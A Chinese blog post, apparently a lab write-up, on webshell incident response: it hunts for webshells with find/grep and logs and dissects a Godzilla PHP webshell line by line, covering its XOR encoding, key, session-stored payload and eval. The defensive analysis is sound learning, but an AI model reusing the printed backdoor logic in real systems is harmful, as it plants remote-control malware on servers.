@@ -1,0 +1,1036 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="123456789title: DIR-815date: 2024-11-25categories:  - 应急响应public: truestatus: draftcomments: trueexcerpt: 玄机入门，简单的webshell查杀author: Dusk  导言 作为一个Pwn手，在经历ccb下午渗透赛只能给队友提供情绪价值去看应急响应被内核马戏耍后，~~痛定思痛,~~决定学习一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dusk的怪东西">
+<meta property="og:url" content="https://fallingdusky.github.io/2025/04/09/%E7%8E%84%E6%9C%BA_%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94_webshell%E6%9F%A5%E6%9D%80/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="123456789title: DIR-815date: 2024-11-25categories:  - 应急响应public: truestatus: draftcomments: trueexcerpt: 玄机入门，简单的webshell查杀author: Dusk  导言 作为一个Pwn手，在经历ccb下午渗透赛只能给队友提供情绪价值去看应急响应被内核马戏耍后，~~痛定思痛,~~决定学习一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/jTDHuacdVOmRgCB.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/6rHIjmd8fREg5W2.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/ir78vLjP39b1TZV.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/qytvc5AfZ9mLuMQ.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/ZOYRUpnsIqmFiby.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/pYfuURMLIXg5V1h.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/9NB3pZDK5nthagW.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/2G8RNdZWaeE3tcx.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/L2mGrCsEJtx6V7K.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/mfODByuN3RrS5FX.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/V1JSlyROCokLeUE.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/JLwD6VumYc8S1b2.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/4EzbogjXQYDprIk.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/hGPE9poMfe54mHg.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/M15yajiH8VORPz7.png">
+<meta property="og:image" content="https://s2.loli.net/2025/04/16/qdwuLa6etZj27iy.png">
+<meta property="article:published_time" content="2025-04-09T12:40:35.916Z">
+<meta property="article:modified_time" content="2025-04-16T12:39:09.725Z">
+<meta property="article:author" content="Dusk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2025/04/16/jTDHuacdVOmRgCB.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Dusk的怪东西</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+            <a href="/" id="subtitle">什么——都在这里——</a>
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-玄机_第一章_应急响应_webshell查杀" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/09/%E7%8E%84%E6%9C%BA_%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94_webshell%E6%9F%A5%E6%9D%80/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-09T12:40:35.916Z" itemprop="datePublished">2025-04-09</time>
+    <time style="display: none;" id="post-update-time">2025-04-16</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: DIR-815</span><br><span class="line">date: 2024-11-25</span><br><span class="line">categories:</span><br><span class="line">  - 应急响应</span><br><span class="line">public: true</span><br><span class="line">status: draft</span><br><span class="line">comments: true</span><br><span class="line">excerpt: 玄机入门，简单的webshell查杀</span><br><span class="line">author: Dusk</span><br></pre></td></tr></table></figure>
+<h1 id="导言"><a class="markdownIt-Anchor" href="#导言"></a> 导言</h1>
+<p>作为一个Pwn手，在经历ccb下午渗透赛只能给队友提供情绪价值去看应急响应被内核马戏耍后，~~痛定思痛,~~决定学习一些应急响应，为队友提供一些绵薄之力</p>
+<h1 id="前置工具"><a class="markdownIt-Anchor" href="#前置工具"></a> 前置工具</h1>
+<p>仅需<strong>Xshell8</strong></p>
+<h1 id="webshell应急响应"><a class="markdownIt-Anchor" href="#webshell应急响应"></a> Webshell应急响应</h1>
+<h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2>
+<p>首先介绍<strong>Webshell是什么</strong></p>
+<p><strong>WebShell</strong> 是攻击者上传到服务器的一种<strong>恶意脚本文件</strong>，可以像后门一样远程控制服务器，可以做到但不限于如下功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	查看/下载/上传文件</span><br><span class="line">​	执行命令</span><br><span class="line">​	修改数据库</span><br><span class="line">​	横向移动</span><br></pre></td></tr></table></figure>
+<p>​	而其应急响应指的是在发现服务器或网站被植入WebShell（一种通过Web页面远程控制服务器的恶意脚本）后的快速处置和修复过程，其目的是<strong>尽快阻止攻击者的进一步操作、查明入侵路径、修复漏洞并恢复系统安全状态</strong>。</p>
+<h2 id="查杀手段"><a class="markdownIt-Anchor" href="#查杀手段"></a> 查杀手段</h2>
+<h3 id="特征值搜索"><a class="markdownIt-Anchor" href="#特征值搜索"></a> 特征值搜索</h3>
+<p>首先是确定文件类型，一般而言在Web中容易成为恶意脚本文件的文件后缀是<code>jsp,php,asp,aspx</code>，刚开始的时候可以从这种文件类型着手调查。</p>
+<p>然后是查找特征值，常见后门函数是<code>exec(),eval(),system(),assert(),base64_decode()</code>等，如果能查到是最好，不能的话就只能从其它方面入手</p>
+<h3 id="日志搜寻"><a class="markdownIt-Anchor" href="#日志搜寻"></a> 日志搜寻</h3>
+<p>​</p>
+<p>Webshell的执行时通常在<strong>web日志</strong>中留下痕迹**(不是系统日志)<strong>，我们通常需要在海量的请求中寻找异常的操作。通常是</strong>看哪个请求平时是GET此时却是POST**，并且返回状态码<strong>200(成功执行)</strong>。那这个请求路径就很有可能是Webshell，但也不能完全确定，还是得输出看看文件内容是什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态码补充</span><br><span class="line">403————被waf拦截</span><br><span class="line">404————文件不存在</span><br><span class="line">500————服务端异常</span><br></pre></td></tr></table></figure>
+<h3 id="使用工具"><a class="markdownIt-Anchor" href="#使用工具"></a> 使用工具</h3>
+<p>相比于人工排查，使用工具的效率显然是更加高效，这里主要就推荐两个一个是<strong>D盾</strong>，一个是<strong>微步在线</strong>的<strong>云沙箱</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.d99net.net" style="text-decoration:none; color:blue;">D盾</a>的优势是<strong>界面简洁、清晰明了</strong>，最重要的是<strong>无需网络要求</strong>，是线下比赛的好帮手</p>
+<p><img src="https://s2.loli.net/2025/04/16/jTDHuacdVOmRgCB.png" alt="屏幕截图 2025-04-14 135406" /></p>
+<p>而<a target="_blank" rel="noopener" href="https://s.threatbook.com" style="text-decoration:none; color:blue;">云沙箱</a>胜在<strong>功能强大</strong>，唯一的缺点是没有钞能力就只能体验，免费版每日分析有限</p>
+<p><img src="https://s2.loli.net/2025/04/16/6rHIjmd8fREg5W2.png" alt="屏幕截图 2025-04-14 140133" /></p>
+<h1 id="解题步骤"><a class="markdownIt-Anchor" href="#解题步骤"></a> 解题步骤</h1>
+<h2 id="黑客webshell里面的flag-flagxxxxx-xxxx-xxxx-xxxx-xxxx"><a class="markdownIt-Anchor" href="#黑客webshell里面的flag-flagxxxxx-xxxx-xxxx-xxxx-xxxx"></a> 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h2>
+<p>在Xshell中通过把<strong>主机</strong>改成<strong>玄机靶场提供的IP</strong>，端口默认<strong>22</strong>，输入靶机的账号密码即可成功连接靶机</p>
+<p><img src="https://s2.loli.net/2025/04/16/ir78vLjP39b1TZV.png" alt="image-20250416130546493" /></p>
+<p>在开始链接后，得先回到根目录，不然没有回显</p>
+<p><img src="https://s2.loli.net/2025/04/16/qytvc5AfZ9mLuMQ.png" alt="image-20250416130613247" /></p>
+<p>Linux根目录下各文件夹和文件的作用</p>
+<table>
+<thead>
+<tr>
+<th>目录</th>
+<th>作用说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/bin</code></td>
+<td>存放<strong>基本用户命令</strong>，如 <code>ls</code>、<code>cp</code>、<code>mv</code>、<code>bash</code> 等，单用户模式下也可使用。</td>
+</tr>
+<tr>
+<td><code>/boot</code></td>
+<td>启动文件目录，包含内核（如 <code>vmlinuz</code>）、引导加载器（如 <code>grub</code>）相关文件。</td>
+</tr>
+<tr>
+<td><code>/dev</code></td>
+<td>设备文件目录，Linux 一切皆文件，包括磁盘（如 <code>/dev/sda</code>）、终端、USB 等。</td>
+</tr>
+<tr>
+<td><code>/etc</code></td>
+<td>系统配置文件目录，如网络配置、服务配置、用户账户配置等（如 <code>/etc/passwd</code>、<code>/etc/hosts</code>）。</td>
+</tr>
+<tr>
+<td><code>/home</code></td>
+<td>普通用户的家目录，如 <code>/home/user</code>。</td>
+</tr>
+<tr>
+<td><code>/initrd.img</code>、<code>/initrd.img.old</code></td>
+<td>初始 RAM 磁盘镜像，启动时用于加载驱动和挂载根文件系统。<code>*.old</code> 是旧版本备份。</td>
+</tr>
+<tr>
+<td><code>/lib</code></td>
+<td>系统程序运行所需的基础共享库，如 libc、动态链接器等，供 <code>/bin</code> 和 <code>/sbin</code> 使用。</td>
+</tr>
+<tr>
+<td><code>/lib32</code></td>
+<td>存放 32 位系统库，供兼容老旧 32 位程序使用。</td>
+</tr>
+<tr>
+<td><code>/lib64</code></td>
+<td>存放 64 位系统库，是现代系统的主流配置。</td>
+</tr>
+<tr>
+<td><code>/libx32</code></td>
+<td>用于 x32 ABI（在 64 位平台上运行的 32 位地址空间程序）的共享库（较少用）。</td>
+</tr>
+<tr>
+<td><code>/lost+found</code></td>
+<td>ext 文件系统下修复错误时保存“孤儿文件”的地方（<code>fsck</code> 工具用）。</td>
+</tr>
+<tr>
+<td><code>/media</code></td>
+<td>可移动设备挂载点，如 USB、CD-ROM（由系统自动挂载）。</td>
+</tr>
+<tr>
+<td><code>/mnt</code></td>
+<td>临时挂载点，用于手动挂载设备，如临时挂载 ISO 或远程文件系统。</td>
+</tr>
+<tr>
+<td><code>/opt</code></td>
+<td>第三方应用程序安装目录（如 <code>/opt/google/chrome</code>）。</td>
+</tr>
+<tr>
+<td><code>/proc</code></td>
+<td>虚拟文件系统，内核和进程信息接口，如 <code>/proc/cpuinfo</code>、<code>/proc/1/</code>。</td>
+</tr>
+<tr>
+<td><code>/root</code></td>
+<td><strong>root 用户的主目录</strong>，区别于 <code>/home/root</code>。</td>
+</tr>
+<tr>
+<td><code>/run</code></td>
+<td>用于存放系统启动后运行时的临时文件，如 PID 文件、Socket 等（挂载于 tmpfs）。</td>
+</tr>
+<tr>
+<td><code>/sbin</code></td>
+<td>系统管理员命令，如 <code>iptables</code>、<code>reboot</code>、<code>fsck</code> 等，通常不供普通用户使用。</td>
+</tr>
+<tr>
+<td><code>/srv</code></td>
+<td>服务数据目录，Web、FTP 等服务可在此处放数据（如 <code>/srv/www/</code>）。</td>
+</tr>
+<tr>
+<td><code>/sys</code></td>
+<td>内核虚拟文件系统，暴露设备、驱动等结构，供用户空间与内核交互。</td>
+</tr>
+<tr>
+<td><code>/tmp</code></td>
+<td>临时文件目录，系统重启时可能会清空，用户和程序常用于临时写文件。</td>
+</tr>
+<tr>
+<td><code>/usr</code></td>
+<td>用户程序和共享资源目录，包括大部分程序和库，如 <code>/usr/bin</code>、<code>/usr/lib</code>。</td>
+</tr>
+<tr>
+<td><code>/var</code></td>
+<td>可变数据目录，如<strong>日志</strong>（<code>/var/log</code>）、邮件、缓存、数据库数据等。</td>
+</tr>
+</tbody>
+</table>
+<p>当然这么多文件夹一个个找是不现实的，我们得找到特定的文件，肯定需要需要借助Linux的指令取寻找特定的文件</p>
+<p><code>find [路径] [行为模式] [表达式]</code></p>
+<p>例如我们想查找php的危险函数，就用如下表达式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</span><br><span class="line">./		====&gt;	当前目录</span><br><span class="line">-type	====&gt;	指定想查找的类型</span><br><span class="line">				f	====&gt;	普通文件:如txt,php,elf文件等</span><br><span class="line">				d	====&gt;	目录:如/home</span><br><span class="line">				l	====&gt;	符号链接:如usr/bin/python-&gt;python3</span><br><span class="line">				c	====&gt;	字符设备文件:/dev/tty等</span><br><span class="line">				b	====&gt;	块设备文件:/dev/sda(硬盘)</span><br><span class="line">				s	====&gt;	套接字:通信的socket文件</span><br><span class="line">				p	====&gt;	命名管道:管道通信中产生的特殊文件</span><br><span class="line">-name	====&gt;	按照文件名进行查找(区分大小写)</span><br><span class="line">&quot;*.php&quot; ====&gt;	所有以php结尾的文件</span><br><span class="line">|		====&gt;	管道符，把前一个命令的输出，作为后一个命令的输入</span><br><span class="line">xargs	====&gt;	将管道中的内容转换成命令行参数</span><br><span class="line">grep	====&gt;	在文件中按关键词或正则表达式查找匹配的行，并输出这些行</span><br><span class="line">&quot;eval(&quot; ====&gt;	输出&quot;*.php&quot;中包含有&quot;eval(&quot;的文件路径</span><br></pre></td></tr></table></figure>
+<p>找其它类型文件的危险函数也同上</p>
+<p>如果想查询免杀马是否采用了某种编码进行隐藏，可用如下指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;base64_decode&quot; </span><br></pre></td></tr></table></figure>
+<p>经过查找，发现确实有两个webshell，但是只有一个有flag</p>
+<p><img src="https://s2.loli.net/2025/04/16/ZOYRUpnsIqmFiby.png" alt="image-20250416134007392" /></p>
+<p><img src="https://s2.loli.net/2025/04/16/pYfuURMLIXg5V1h.png" alt="屏幕截图 2025-04-16 134054" /></p>
+<p>这一串字符就是flag</p>
+<p>分析一下这个webshell做了什么吧</p>
+<p><code>@session_start()</code>启动了会话，<code>@</code>用于抑制任何可能的错误信息输出和警告</p>
+<p><code>@set_time_limit(0)</code>设置了时间无限，意味着该脚本可以无限时长存在</p>
+<p><code>@error_reporting</code>禁止错误输出，更加保险</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>以<code>$K</code>为密钥将<code>$D</code>进行数据加密，隐藏恶意输入的内容</p>
+<p><code>$payloadName='payload'</code>定义一个常量，表示存储恶意输入的会话的键名</p>
+<p><code>$key='3c6e0b8a9c15224a'</code>密钥</p>
+<p><code>$data=file_get_contents(&quot;php://input&quot;)</code>获取<code>php://input</code>流数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">	<span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br></pre></td></tr></table></figure>
+<p>如果data是否成功读取了数据，成功就<strong>通过key进行加密</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;  </span><br><span class="line">    <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br></pre></td></tr></table></figure>
+<p>首先<strong>检查会话中是否有payloadName</strong>，若存在就将payload再通过key加密，然后检测payload的加密数据中是否存在<code>getBasicsInfo</code>，若不存在，就再次加密，然后再执行payload中的字符串</p>
+<p><code>@run($data)</code>会尝试执行data中的命令，然后通过key加密再echo出，这样可以隐藏返回数据，使恶意代码不易被查看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>若是<strong>会话中不存在payloadName</strong>，则会直接检查流数据中是否存在<code>getBasicsInfo</code>，若存在，则会将加密后的data数据存储如会话中，便于再后续请求中继续利用该恶意代码</p>
+<h2 id="黑客使用的什么工具的shell-github地址的md5-flagmd5"><a class="markdownIt-Anchor" href="#黑客使用的什么工具的shell-github地址的md5-flagmd5"></a> 黑客使用的什么工具的shell github地址的md5 flag{md5}</h2>
+<p>将这些代码直接丢进安恒云沙箱里，这个可以检测出是什么类型的病毒，方便我们找flag</p>
+<p><img src="https://s2.loli.net/2025/04/16/9NB3pZDK5nthagW.png" alt="image-20250416154210061" /></p>
+<p><img src="https://s2.loli.net/2025/04/16/2G8RNdZWaeE3tcx.png" alt="屏幕截图 2025-04-16 140403" /></p>
+<p>确定是哥斯拉木马，只需要找它的github项目地址就行，网上一搜有好些，最终找到如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br></pre></td></tr></table></figure>
+<p>再md5一下就好</p>
+<h2 id="黑客隐藏shell的完整路径的md5-flagmd5-注-xxxxxxxxxxxxxxxxxx"><a class="markdownIt-Anchor" href="#黑客隐藏shell的完整路径的md5-flagmd5-注-xxxxxxxxxxxxxxxxxx"></a> 黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx</h2>
+<p>题目明说了是隐藏，所以<strong>无法直接ls查询到</strong>，寻找隐藏文件的指令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">-a	显示所有文件，包括以 . 开头的隐藏文件</span><br><span class="line">-l 以长表格显示，包含权限、所有者、大小、修改时间等信息</span><br></pre></td></tr></table></figure>
+<p>不过其实我们在最开始的时候就找到了，就是**.Mysqli.php**文件，路径如下</p>
+<p><img src="https://s2.loli.net/2025/04/16/L2mGrCsEJtx6V7K.png" alt="屏幕截图 2025-04-09 201354" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br></pre></td></tr></table></figure>
+<h2 id="黑客免杀马完整路径-md5-flagmd5"><a class="markdownIt-Anchor" href="#黑客免杀马完整路径-md5-flagmd5"></a> 黑客免杀马完整路径 md5 flag{md5}</h2>
+<p>既然是免杀马，那就说明我们无法通过特征值搜索直接得到，它肯定做了些混淆、拼接等操作，例如base加密，异或操作等，我们无法直接通过<code>find</code>来寻找它，这种情况下，我们一般能够采取的办法就是看日志，<strong>web日志</strong></p>
